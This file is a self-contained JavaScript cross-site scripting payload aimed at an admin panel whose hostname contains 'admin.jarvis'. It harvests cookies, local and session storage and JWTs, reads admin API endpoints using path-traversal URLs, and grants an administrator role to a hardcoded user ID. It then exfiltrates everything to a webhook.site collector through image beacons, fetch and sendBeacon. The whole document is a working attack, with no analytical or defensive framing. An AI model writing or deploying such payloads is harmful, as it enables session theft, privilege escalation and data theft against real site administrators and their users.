(async()=>{
try{
if(!String(location.hostname||'').includes('admin.jarvis')){return;}
const C='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14';
const steal={cookie:'',ls:'',ss:'',href:'',ua:'',ref:'',jwt:'',cookieStore:''};
try{steal.cookie=(document.cookie||'').substring(0,2000);}catch(e){}
try{
  if(window.cookieStore&&cookieStore.getAll){
    const all=await cookieStore.getAll();
    steal.cookieStore=JSON.stringify(all).substring(0,2000);
  }
}catch(e){}
try{
  const ls={}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i); ls[k]=(localStorage.getItem(k)||'').substring(0,400);}
  steal.ls=JSON.stringify(ls).substring(0,2500);
}catch(e){}
try{
  const ss={}; for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i); ss[k]=(sessionStorage.getItem(k)||'').substring(0,400);}
  steal.ss=JSON.stringify(ss).substring(0,2500);
}catch(e){}
try{steal.href=String(location.href||'').substring(0,400);}catch(e){}
try{steal.ref=String(document.referrer||'').substring(0,200);}catch(e){}
try{steal.ua=String(navigator.userAgent||'').substring(0,200);}catch(e){}
try{
  for(const store of [localStorage,sessionStorage]){
    for(let i=0;i<store.length;i++){
      const v=store.getItem(store.key(i))||'';
      if(v.startsWith('eyJ')&&v.length>80){steal.jwt=v.substring(0,800);break;}
    }
    if(steal.jwt) break;
  }
}catch(e){}

// pull useful authenticated endpoints with admin cookie (HttpOnly still sent)
const pulls={};
async function pull(name, path, opt){
  try{
    const r=await fetch(path, Object.assign({credentials:'include',headers:{'Accept':'application/json'}}, opt||{}));
    const t=await r.text();
    pulls[name]={status:r.status, body:t.substring(0,1200)};
  }catch(e){pulls[name]={error:String(e).substring(0,120)};}
}
await pull('me','/api/session/login/../../v1/me');
await pull('roles','/api/session/login/../../v1/admin/roles');
await pull('users','/api/session/login/../../v1/admin/users?page=1&pageSize=5');

const uid='01967db5-ae00-4642-96ba-f82321e15ef0';
let assignStatus=0,roleId='';
try{
  const rolesRaw=pulls.roles&&pulls.roles.body?JSON.parse(pulls.roles.body):{};
  const roles=Array.isArray(rolesRaw.data)?rolesRaw.data:[];
  if(roles.length){
    const adminRole=roles.find(r=>r.name&&(/admin|super/i).test(String(r.name)))||roles[0];
    roleId=String(adminRole.id||'').substring(0,12);
    await pull('assign','/api/session/login/../../v1/admin/users/'+uid+'/roles',{
      method:'POST',
      headers:{'Content-Type':'application/json','Accept':'application/json'},
      body:JSON.stringify({roleId:adminRole.id})
    });
    assignStatus=(pulls.assign&&pulls.assign.status)||0;
  }
}catch(e){}

const payload={
  t:Date.now(),
  host:location.hostname,
  href:steal.href,
  ref:steal.ref,
  ua:steal.ua,
  cookie:steal.cookie,
  cookieStore:steal.cookieStore,
  ls:steal.ls,
  ss:steal.ss,
  jwt:steal.jwt,
  assign:assignStatus,
  roleId:roleId,
  pulls:pulls
};

// durable HTTPS collectors (never depend on laptop tunnel)
const sinks=[C];
const q=new URLSearchParams({
  s:String(assignStatus),
  r:roleId,
  j:steal.jwt?'1':'0',
  ck:(steal.cookie||'').substring(0,350),
  h:(steal.href||'')
});
for(const s of sinks){
  try{new Image().src=s+(s.includes('?')?'&':'?')+q.toString();}catch(e){}
  try{
    fetch(s,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify(payload)});
  }catch(e){}
  try{
    navigator.sendBeacon&&navigator.sendBeacon(s, new Blob([JSON.stringify(payload)],{type:'text/plain'}));
  }catch(e){}
}
}catch(e){
  try{new Image().src='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14?err='+encodeURIComponent(String(e).substring(0,140));}catch(x){}
}
})();
